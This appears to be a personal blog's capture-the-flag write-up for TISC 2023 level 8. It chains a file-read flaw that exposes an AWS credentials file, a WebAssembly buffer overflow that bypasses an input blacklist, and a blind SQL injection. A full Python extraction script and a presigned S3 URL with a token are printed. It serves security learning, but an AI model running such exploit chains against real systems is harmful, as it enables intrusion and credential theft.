<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" href="/ctf-writeups/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="dl1D1u59Q1pKaeEVUFtuHxnfuBFKhks8hA19r7WuxTY">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Judson:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Gabarito:wght@400..900&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400..600" rel="stylesheet">
    <title>TISC 2023 - Blind SQL Injection</title>
    <script type="module" crossorigin="" src="/ctf-writeups/assets/app-e4752f4c.js"></script>
    <link rel="stylesheet" href="/ctf-writeups/assets/index-70594d0d.css">
  <meta property="article:tag" content="TISC 2023"><meta property="article:tag" content="web"><meta property="article:tag" content="rev"><meta property="article:tag" content="pwn"><meta property="article:tag" content="cloud"><meta name="description" content="Opening the site, I am greeted with a login page. I tried some sql injection payloads but they were blocked by a blacklist. Hence, I wrote a quick python script to fuzz all allowed characters, and got: `&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;`. Obviously, sql injection is not possible with only alphabets, so we need to find something else. I looked at the source code provided.

I saw there was a LFI vulnerability in server.js:

```javascript:server.js
app.post('/api/submit-reminder', (req, res) => {
    const username = req.body.username;
    const reminder = req.body.reminder;
    const viewType = req.body.viewType;
    res.send(pug.renderFile(viewType, { username, reminder }));
});
```

Looking at the Dockerfile, it seems that there is a aws config folder at `/root/.aws`. Hence, we can access the credentials by sending a post request to `/api/submit-reminder` with viewType as `/root/.aws/credentials`. This is the response:

![](/ctf-writeups/tisc23/blind-sql-injection-0.png)

I set the credentials using `aws configure`.

To list the permissions available, I tried using the `getUserIamPermissions.sh` script from level 7, however it didn't work because the credentials did not have the necessary permissions.

However, there is a lambda function invocation of `craft_query` in the code, hence I deduced that I would be able to get the function. I ran `aws lambda get-function --function-name craft_query`. This returned a large json response with a link to the code:

```json
...

  &quot;Code&quot;: {
    &quot;RepositoryType&quot;: &quot;S3&quot;,
    &quot;Location&quot;: &quot;https://awslambda-ap-se-1-tasks.s3.ap-southeast-1.amazonaws.com/snapshots/051751498533/craft_query-a989953b-8c24-41f0-ac22-813b4ca32bbc?versionId=JNLr5qtX.LFHg63fpryY.eZVBru5aTvH&amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjECQaDmFwLXNvdXRoZWFzdC0xIkgwRgIhAPWbYE%2FW7LQeM1c%2BY6GZjL4i4%2BRBpUJOc1xIARN7vDOPAiEA83kkf81hFV2K4SfoFT2q70i2%2Bs95HxJ1cb7IuCAxb5AqwAUILRAEGgwyOTUzMzg3MDM1ODMiDMeA9zfqSUVUNA1frSqdBd5TVP2%2FlOom3eVELxgmxgyQLxQ7lr0CBpEg3lI%2B%2F5wILSzWB9E8BYSEuDSQOlYKArG6LE2jdXcEsXm2PGXe3pK%2F97GvZGOiIJrdVRfKVW9Y%2FZYerD1X6inPYz1u%2BmvVDhZZYzm7umrwNNOybY2A0GjXt7uUUxOy16Gy8GuZExynIEEYeC81%2BBMA6ieLn8osUGDDh%2BAfSj9vWV56YlKz2qI4DTNaz7%2BbVxCYLXr3sIL%2FPN%2BnXq1xF6M6sWbtFnYw58t6Duf5W1gBI%2BGp5EnDXlVbRQrTqo4A6xZVoTEe5B6iGNJq629qEjUZvah4lafSIqqV6MLnoSf5K1tLAJSvQmDGirbHx%2F6B85tC5gEfP9WZlFaKhdOoJWQBOypyu6LzfUld6TOK1ZssoJVED3p211j4mk4lCQp6trcRkPaWJnLGmH5YrJ40wmsWjcTQpM5JpIUWxNcDinWDlAP5cjwLpjk3sy5FExeRYH%2B6%2FRrR1NuJCevzOcXc1Xblnn%2FWNDM8I3GDxHAgRZLLyV3MiJkhmJLt0w4eSTAdOSnXskRzhJiwXu11yQAsbJIb58ZkXf3hHarIg6jgYMreSStiatH3bSRFtqEowEKPtMGwyMYgMNu4ZzQM%2Fc7GruI1aWQWgwrmwxTmaJTQ1k4mSVqCuKUxU%2F2KVmdoCeUq3%2F0yXGSMsWv30SH8tFVt4sSxFNQSHwrhaJBIaclVAbpRPkwxOwK04cC6oUOuzJBAfTZV7NIAW0rFcPelO1qnOFnGaXEA1P0TnEJ5ZAAsz7hnEi3GUM1PPYvdpN6FA2KbvDvU7i%2BKpFfiUA%2BTiRY0QbpeN9dXT9KDJrMDDjL4903hWqyQOEqLletQKQU%2Bmz%2FDm%2Bmtw6xOf8%2FGYdV4M3sNJu0VkQIJXDCJgPCoBjqwAdcXEkuE%2BsHOCZjSNqyj7Dx89h%2FbJO2Y%2Brtit8QmiInVu5rkvoIia9rrC%2FNUa3APGV1t1Iskn3NyxsywLXl1rkvC7ONpkrbfH%2FUwzxzxVVJ6fO76u9zsDdpZXg8MLWwzhOYb%2BtSG9FrJn4VwkMVr4MZmykXsKP%2BkeNBaYWdboV3R8vghydMTjNhG2kMSrcvDUSHT0DD7UckOH0wvN3xvRW97vk3phBssxvVpwWAzajN7&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Date=20231003T124953Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=600&amp;X-Amz-Credential=ASIAUJQ4O7LP4VD3LLND%2F20231003%2Fap-southeast-1%2Fs3%2Faws4_request&amp;X-Amz-Signature=06d27d9e23c01d8a7e9ab9fb19dd185864028bd5ffa623ab301e5d471ba05f41&quot;
  }

...
```

Clicking the link downloaded a zip file, which when extracted gave 3 files: `index.js`, `site.js`, and `site.wasm`.

It seems that `index.js` and `site.js` are just used to connect the webassembly binary to the lambda function, and the main logic is in the binary. At this point, I did some reading up on webassembly exploitation before continuing, since I had no prior experience with it.

I disassembled the binary using `wasm-decompile`, and wrote a quick script to inline variables since the decompiled output contained a lot of &quot;un-inlined constants&quot;. Here is the script:

```python:cleaner.py
from collections import namedtuple
import re


def consume_identifier(line, i):
    start = i
    while i < len(line) and (line[i].isalpha() or line[i] == '_'):
        i += 1
    return i, line[start:i]


def all_remaining_identifiers(line, i):
    names = []
    while i < len(line):
        while i < len(line) and not (line[i].isalpha() or line[i] == '_'):
            i += 1
        if i >= len(line):
            break

        name_i = i
        i, name = consume_identifier(line, i)
        names.append((name, name_i, i))
    return names


class Expr:
    def __init__(self, expr, used_vars, can_be_removed):
        self.expr = expr
        self.used_vars = used_vars
        self.can_be_removed = can_be_removed
    def __repr__(self):
        return 'Expr({!r}, {!r}, {!r})'.format(self.expr, self.used_vars, self.can_be_removed)


def clean_function(lines):
    redundant_vars = {}
    exprs_to_replace = []
    cleaned_lines = [line for line in lines]
    assignments = []
    num_usages = {}


    for line_no, line in enumerate(lines):
        i = 0
        while line[i] == ' ':
            i += 1
        
        if line[i:].startswith('var ') and ' = ' in line:
            i += 4
            i, name = consume_identifier(line, i)
            expression = line.split(' = ')[1][:-2]  # remove ;\n
            if not re.search(r'[a-zA-Z_]\(', expression):
                # check that does not contain a function call
                # if has a function call, cannot move it
                used_vars = all_remaining_identifiers(expression, 0)
                redundant_vars[name] = Expr(expression, used_vars, True)
                assignments.append((line_no, name))

        elif ' = ' in line:
            # reassignment
            i, name = consume_identifier(line, i)
            if name in redundant_vars:
                redundant_vars[name].can_be_removed = False

        used_vars = all_remaining_identifiers(line, 0)
        for name, _, _ in used_vars:
            num_usages[name] = num_usages.get(name, 0) + 1
        exprs_to_replace.append((line_no, used_vars))


    def clean_expr(expr):
        expr_s = expr.expr
        for name, start, end in reversed(expr.used_vars):
            if name in redundant_vars and redundant_vars[name].can_be_removed:
                expr_s = expr_s[:start] + clean_expr(redundant_vars[name]) + expr_s[end:]
        if ' ' in expr_s:
            expr_s = '(' + expr_s + ')'
        return expr_s


    for line_no, used_vars in reversed(exprs_to_replace):
        i = cleaned_lines[line_no].find(' = ') + 3
        for name, start, end in reversed(used_vars):
            if name in redundant_vars and redundant_vars[name].can_be_removed:
                cleaned_lines[line_no] = cleaned_lines[line_no][:start] + clean_expr(redundant_vars[name]) + cleaned_lines[line_no][end:]
                num_usages[name] -= 1

    for line_no, name in reversed(assignments):
        if num_usages[name] < 0:
            print('ERROR:', name)
        if num_usages[name] == 0:
            cleaned_lines.pop(line_no)

    return cleaned_lines


def main():
    with open('site.dcmp') as f:
        lines = f.readlines()
    
    i = 0
    while i < len(lines):
        if lines[i].startswith('function ') or lines[i].startswith('export function '):
            end_i = lines.index('}\n', i)
            cleaned_lines = clean_function(lines[i+1:end_i])
            lines = lines[:i+1] + cleaned_lines + lines[end_i:]
            i += len(cleaned_lines) + 1
        i += 1

    with open('out.dcmp', 'w') as f:
        f.write(''.join(lines))

main()
```

Essentially, it converts code like 

```plaintext
var c:int = g_a;
var d:int = 160;
var e:int = c - d;
```

to

```plaintext
var e:int = g_a - 160;
```

where c and d variables are not used anywhere else. Now, the code was a bit more readable. Here is the updated craft_query function:

```plaintext
export function craft_query(username:int, password:int):int {
	var e:int = DATA - 160;
	DATA = e;
	e[39]:int = username;
	e[38]:int = password;
	e[37]:int = 1;
	e[3]:int = 1;
	e[2]:int = 2;
	f_1(e + 80, e[39]:int);
	f_2(e + 16, e[38]:int, 59);
	e[75]:byte = 0;
	var z:int = call_indirect(e + 80, e + 16, e[37]:int);
	DATA = e + 160;
	return z;
}
```

Next, I looked at the function `f_1`.

```plaintext
function f_1(ptr:int, username:int) {
	var e:int_ptr = DATA - 32;
	DATA = e;
	e[7] = ptr;
	e[6] = username;
	loop L_b {
		if (eqz((e[6][0] &amp; 255 != 0) &amp; 1)) goto exit;
		if (eqz(((e[6][0] << 24) >> 24 == 37))) goto B_d;  # %
		var fa:int = hex_to_int(((e[6][1] << 24) >> 24));
		e[5] = fa;
		var la:int = hex_to_int(((e[6][2] << 24) >> 24));
		e[4] = la;
		if (eqz(((e[5] != -1) &amp; 1))) goto B_f;
		if (eqz(((e[4] != -1) &amp; 1))) goto B_f;
		e[3] = ((e[5] << 4) + e[4]);
		e[6] = (e[6] + 3);
		utf8encoding(e[7], e[3]);
		var lb:int = strlen(e[7]);
		e[7] = (e[7] + lb);
		goto B_e;
		label B_f:
		e[6] = (e[6] + 1);
		var sb:byte_ptr = e[7];
		e[7] = (sb + 1);
		sb[0] = e[6][0];
		label B_e:
		goto B_c;
		label B_d:
		e[6] = (e[6] + 1);
		var zb:byte_ptr = e[7];
		e[7] = (zb + 1);
		zb[0] = e[6][0];
		label B_c:
		continue L_b;
	}
	unreachable;
	label exit:
	e[7][0] = 0;
	DATA = e + 32;
}
```

I analysed the functions `hex_to_int`, `utf8encoding` and `strlen` by reading the code, and I renamed them accordingly. So the function seems to be copying all the bytes in username to a buffer, and it provides url decoding.

Next, I needed to setup a work environment so I could test the wasm binary. After trying various tools unsuccessfully, I eventually just modified `index.js` to run the function and print the result:

```javascript:index.js
...

(async () => {
  CraftQuery = await initializeModule();
  const result = CraftQuery('A', 'B');
  console.log(result);
})();
```

This produced `SELECT * from Users WHERE username=&quot;A&quot; AND password=&quot;B&quot;` as expected. I now tried to test for a buffer overflow. Passing `&quot;A&quot;.repeat(100)` as the username gave a `memory access out of bounds` error - a sign there was indeed some buffer overflow.

Using binary search, I narrowed it down to 67 characters, and passing an additional character gave a `null function or function signature mismatch` error. I needed to inspect the state of the memory, hence I wrote the memory buffer to a file:

```javascript:index.js
...

(async () => {
  CraftQuery = await initializeModule();
  const result = CraftQuery('A'.repeat(67), 'B');
  console.log(result);
  require('fs').writeFileSync('mem.bin', Buffer.from(EmscriptenModule.asm.memory.buffer));
})();
```

Additionally, I added similar code to `site.js` so that a memory dump would be produced in event of an error:

```javascript:site.js
...

process.on('uncaughtException', (ex) => {
  // suppress ExitStatus exceptions from showing an error
  if (ex !== 'unwind' &amp;&amp; !(ex instanceof ExitStatus) &amp;&amp; !(ex.context instanceof ExitStatus)) {
    require('fs').writeFileSync('mem.bin', Buffer.from(wasmMemory.buffer));
    throw ex;
  }
});

...
```

I wrote a python script to then inspect the memory:

```python:ex_mem.py
with open('mem.bin', 'rb') as f:
    data = f.read()

i = data.find(b'A'*67)
print(i)
print(data[i-100:i+100])
```

This gave the output:

```plaintext
65360
b'P\xff\x00\x00\x00\x00\x00\x00\x10\xff\x00\x00P\xff\x00\x00`\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x01\x00\x00\x00\xa0\xff\x00\x00\xb0\xff\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAA'
```

It seems that right after the list of As there is a 0x1 byte. The memory dump from passing 68 As as the argument shows that this byte is overwritten by a null byte.

```plaintext
65360
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf4\xff\x00\x00\x94\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\xa0\xff\x00\x00\xb0\xff\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAA'
```

I reasoned that this null byte was written to indicate the end of string. Looking at the error message produced, `null function or function signature mismatch`, I postulated that the 0x1 was referring to an entry in the webassembly function table. I listed the entries in this table with the code:

```javascript:site.js
...

  const table = EmscriptenModule.asm.__indirect_function_table;
  console.log(table.length);
  for (let i = 0; i < table.length; i++) {
    console.log(table.get(i));
  }

...
```

```plaintext:output
null
[Function: 8]
[Function: 6]
[Function: 40]
[Function: 41]
[Function: 44]
```

To determine what functions these correspond to, I ran `wasm2wat site.wasm -o site.wat` and found the following:

```plaintext:site.wat
...

  (export &quot;__wasm_call_ctors&quot; (func 1))
  (export &quot;load_query&quot; (func 6))
  (export &quot;is_blacklisted&quot; (func 8))
  (export &quot;craft_query&quot; (func 9))

...
```

So the function in table entry 1 is `is_blacklisted`, and the function in table entry 2 is `load_query`. Looking at the code, it seems that `is_blacklisted` checks if there are any blacklisted characters used, and if not it calls `load_query`, which seems to return the final sql query. So by overwriting the 0x1 byte with 0x2, we can bypass the blacklist! Also, we can use the url decoding method to write the 0x2 byte.

I ran the function with blacklisted characters: `CraftQuery('&quot;'.repeat(68) + '%02', 'B')`, and sure enough, the blacklist was bypassed.

```sql
SELECT * from Users WHERE username=&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; AND password=&quot;B&quot;
```

Now we have sql injection. Referring to the `db-init.sql` file provided, I saw that we needed to get the password of the admin. Unfortunately however, server.js does not give us the results of the sql query.

```javascript:server.js
...

db.query(sql, (err, results) => {
    if (err) {
        req.flash('error', 'Uh oh. Something went wrong.');
        req.session.save(() => {
            res.redirect('/');
        });
    } else if (results.length !== 0) {
        res.redirect(`/reminder?username=${username}`);
    } else {
        req.flash('error', 'Invalid username/password');
        req.session.save(() => {
            res.redirect('/');
        });
    }
});

...
```

Fortunately, though, it does provide us with information on whether 0 rows were returned by the query. We can extract the flag character by character, for example, using a query such as `admin&quot; and binary substring(password, 1, 1) = &quot;T&quot;;#` to check whether the first character is `T`, and we check through all possible characters for each index.

Here is my final solve script:

```python:s.py
import requests
import subprocess
from string import ascii_letters, digits

possible = ascii_letters + digits + '_'

url = 'http://chals.tisc23.ctf.sg:28471/api/login'

j = 6
ans = 'TISC{'
while True:
    for c in possible:
        print(str(j) + ': trying ' + c)
        pay0 = f'admin&quot; and binary substring(password, {j}, 1) = &quot;{c}&quot;;#'
        pay1 = pay0
        pay1 += 'A' * (68 - len(pay0)) + '%02'

        i = 1
        correct = False
        while True:
            if i % 50 == 0:
                print(i)
            resp = requests.post(url, data={'username': pay1, 'password': 'B'})
            if ('Something went wrong' not in resp.text):
                if 'Welcome, admin' in resp.text:
                    correct = True
                elif 'Invalid username/password' in resp.text:
                    correct = False
                else:
                    print('Unexpected result:')
                    print(resp.text)
                    import sys; sys.exit(1)
                break
            i += 1
        
        if correct:
            ans += c
            print(ans)
            j += 1
            break
    
    else:
        print('failed at:', j)
        break
```

Notice the second `while True` loop in sending the request. This was because results from the lambda function were very inconsistent, and invoking the lambda function twice would give different results, so I had to keep trying until the correct sql query was returned. This was why I also added a lot of print statements throughout, so I would not lose progress in event of an error.

Eventually however, I get the flag: `TISC{a1PhAb3t_0N1Y}`"><meta name="author" content="Jia Jie"></head>
  <body>
    <div id="app" data-server-rendered="true"><div><div class="w-full fixed z-20 bg-[#1e1e1e] flex flex-col items-center transition-transform duration-500"><div class="w-full h-16 flex-shrink-0 flex items-center justify-between px-10 max-sm:px-5 max-sm:h-14"><div class="w-10 h-10 flex flex-col items-center justify-center gap-y-1 cursor-pointer mr-3 xl:hidden" data-v-eaee368e=""><div class="bar b1" data-v-eaee368e=""></div><div class="bar b2" data-v-eaee368e=""></div><div class="bar b3" data-v-eaee368e=""></div></div><span class="text-xl font-semibold">Jia Jie's writeups</span><div class="flex-1"></div><button class="w-10 h-10 rounded-full grid place-items-center"><i class="material-symbols-outlined text-2xl">search</i></button><a href="https://github.com/mkofdwu/ctf-writeups" target="_blank" class="w-10 h-10 rounded-full grid place-items-center"><svg width="28" height="28" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18.0015 3C9.71403 3 3.00153 9.7125 3.00153 18C2.99972 21.1487 3.98943 24.2181 5.83024 26.7727C7.67106 29.3273 10.2695 31.2373 13.257 32.232C14.007 32.3625 14.289 31.9125 14.289 31.518C14.289 31.1625 14.2695 29.982 14.2695 28.725C10.5015 29.4195 9.52653 27.807 9.22653 26.9625C9.05703 26.5305 8.32653 25.2 7.68903 24.843C7.16403 24.5625 6.41403 23.868 7.66953 23.85C8.85153 23.8305 9.69453 24.9375 9.97653 25.3875C11.3265 27.6555 13.482 27.018 14.3445 26.625C14.4765 25.65 14.8695 24.9945 15.3015 24.6195C11.964 24.2445 8.47653 22.95 8.47653 17.2125C8.47653 15.5805 9.05703 14.232 10.014 13.1805C9.86403 12.8055 9.33903 11.268 10.164 9.2055C10.164 9.2055 11.4195 8.8125 14.289 10.7445C15.5101 10.4056 16.7718 10.235 18.039 10.2375C19.314 10.2375 20.589 10.4055 21.789 10.743C24.6585 8.793 25.914 9.207 25.914 9.207C26.739 11.2695 26.214 12.807 26.064 13.182C27.0195 14.232 27.6015 15.5625 27.6015 17.2125C27.6015 22.9695 24.096 24.2445 20.757 24.6195C21.3015 25.0875 21.771 25.9875 21.771 27.3945C21.771 29.4 21.7515 31.0125 21.7515 31.5195C21.7515 31.9125 22.0335 32.3805 22.7835 32.2305C25.7608 31.2249 28.3478 29.3111 30.1805 26.7584C32.0132 24.2056 32.9993 21.1425 33 18C33 9.7125 26.2875 3 18 3H18.0015Z" fill="white"></path></svg></a><a href="https://mkofdwu.github.io/" target="_blank" class="h-10 pl-4 pr-2 ml-3 flex items-center font-semibold rounded-full border max-[500px]:hidden"> main website <i class="material-symbols-outlined text-2xl ml-3">arrow_outward</i></a><div class="h-0 hide-scrollbar fixed left-0 top-16 z-10 w-full bg-black overflow-y-auto origin-top duration-300 transition-all xl:hidden max-sm:top-14"><div class="opacity-0 pt-10 duration-300 transition-opacity"><div class="flex flex-col" full-width="true"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a aria-current="page" href="/ctf-writeups/writeups/blind-sql-injection" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 